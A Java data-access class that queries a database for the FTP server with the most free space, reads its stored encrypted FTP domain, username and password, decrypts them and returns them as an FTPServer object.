package com.theah64.xrob.api.database.tables;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.FTPServer;
import com.theah64.xrob.api.utils.DarKnight;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

/**
 * Created by shifar on 12/10/16.
 */
public class FTPServers extends BaseTable<FTPServer> {

    private static final FTPServers instance = new FTPServers();

    private static final String COLUMN_FTP_DOMAIN_ENC = "ftp_domain_enc";
    private static final String COLUMN_FTP_USERNAME_ENC = "ftp_username_enc";
    private static final String COLUMN_FTP_PASSWORD_ENC = "ftp_password_enc";
    private static final String COLUMN_AS_TOTAL_MB_USED = "total_mb_used";
    private static final String COLUMN_AS_FREE_SPACE_IN_MB = "free_space_in_mb";
    private static final String COLUMN_STORAGE_FOLDER_PATH = "storage_folder_path";

    private FTPServers() {
        super("servers");
    }

    public static FTPServers getInstance() {
        return instance;
    }

    public FTPServer getLeastUsedServer() {

        FTPServer ftpServer = null;

        //Query to calculate least used server
        final String query = "SELECT fs.id, fs.name, fs.storage_folder_path, fs.ftp_domain_enc, fs.ftp_username_enc, fs.ftp_password_enc, IFNULL((SUM(m.file_size_in_kb) / 1024), 0) AS total_mb_used, fs.size_in_mb - IFNULL((SUM(m.file_size_in_kb) / 1024), 0) AS free_space_in_mb FROM servers fs LEFT JOIN media m ON m.ftp_server_id = fs.id GROUP BY fs.id ORDER BY free_space_in_mb DESC LIMIT 1;";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final Statement stmt = con.createStatement();
            final ResultSet rs = stmt.executeQuery(query);

            if (rs.first()) {

                final String id = rs.getString(COLUMN_ID);
                final String name = rs.getString(COLUMN_NAME);

                final String domainNameEnc = rs.getString(COLUMN_FTP_DOMAIN_ENC);
                final String usernameEnc = rs.getString(COLUMN_FTP_USERNAME_ENC);
                final String passwordEnc = rs.getString(COLUMN_FTP_PASSWORD_ENC);
                //fsdhfsdfdka

                final String storageFolderPath = rs.getString(COLUMN_STORAGE_FOLDER_PATH);

                final int totalMBUsed = rs.getInt(COLUMN_AS_TOTAL_MB_USED);
                final int freeSpaceInMB = rs.getInt(COLUMN_AS_FREE_SPACE_IN_MB);

                ftpServer = new FTPServer(id, name,
                        DarKnight.getDecrypted(domainNameEnc),
                        storageFolderPath,
                        DarKnight.getDecrypted(usernameEnc),
                        DarKnight.getDecrypted(passwordEnc),
                        totalMBUsed,
                        freeSpaceInMB
                );

                rs.close();

            } else {
                //TSH
                throw new IllegalArgumentException("No ftp server found!");
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return ftpServer;
    }

}
